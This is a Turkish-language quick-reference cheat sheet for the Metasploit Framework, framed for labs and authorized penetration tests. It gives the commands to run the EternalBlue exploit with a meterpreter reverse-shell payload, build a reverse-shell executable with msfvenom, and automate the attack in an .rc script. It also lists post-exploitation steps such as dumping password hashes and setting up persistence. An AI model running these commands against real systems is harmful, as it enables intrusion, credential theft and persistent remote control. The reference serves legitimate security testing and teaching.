# Metasploit Framework — Hızlı Cheatsheet

> Laboratuvar veya yetki verilmiş penetrasyon testleri için hızlı başvuru. İzinsiz kullanım **yasaktır**.

---

## Hemen Özet

* Terminal aç: `msfdb init` → `msfconsole`.
* Modül seç, ayarla, `check`, sonra `exploit`.
* Meterpreter ile gezer, dosya alır veya komut çalıştırırsın.

---

## Başlarken

```bash
msfdb init
msfconsole
```

1. Modül bul:

```bash
search <anahtar_kelime>
```

2. Modül seç:

```bash
use <modul/yolu>
# örn: use exploit/windows/smb/ms17_010_eternalblue
```

3. Ayarları kontrol et:

```bash
show options
```

4. Hedef ve payload ayarla:

```bash
set RHOSTS 10.10.10.5
set LHOST 10.10.14.2
set PAYLOAD windows/meterpreter/reverse_tcp
```

5. Test et ve çalıştır:

```bash
check
exploit
```

---

## Kısa Komut Listesi

* `help` — yardım
* `search <term>` — modül ara
* `info` — modül detayları
* `show exploits|auxiliary|payloads` — içerik listesi
* `set <OPTION> <value>` — ayar yap
* `options` / `show options` — parametreler
* `back` — modülden çık
* `sessions -l` — aktif oturumlar
* `sessions -i <id>` — oturuma bağlan
* `background` — oturumu arka plana at

---

## Meterpreter Komutları

```bash
sysinfo        # sistem bilgisi
getuid         # kullanıcı bilgisi
shell          # shell aç
ls / cd / pwd  # dosya sistemi
download <remote> <local>
upload <local> <remote>
ps             # süreçler
migrate <pid>  # başka sürece geç
hashdump       # SAM hashleri
run persistence # kalıcılık
```

---

## msfvenom

```bash
msfvenom -p <payload> LHOST=<IP> LPORT=<port> -f <format> -o <output>
# örn:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f exe -o shell.exe
```

---

## Basit `.rc` Dosyası

```
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.5
set LHOST 10.10.14.2
set PAYLOAD windows/meterpreter/reverse_tcp
exploit -j
```

Çalıştır:

```bash
msfconsole -r auto-exploit.rc
```

---

## İpuçları

* Önce `check` ile hedefi test et.
* Oturumları `sessions -l` ile takip et, `background` ile kaybetme.
* Log tut, not al ve raporla.
* Metasploit güncellemelerini ara sıra kontrol et.

---

## Lisans

Eğitim amaçlı rehber. Yasal izin olmadan kullanılmamalıdır.
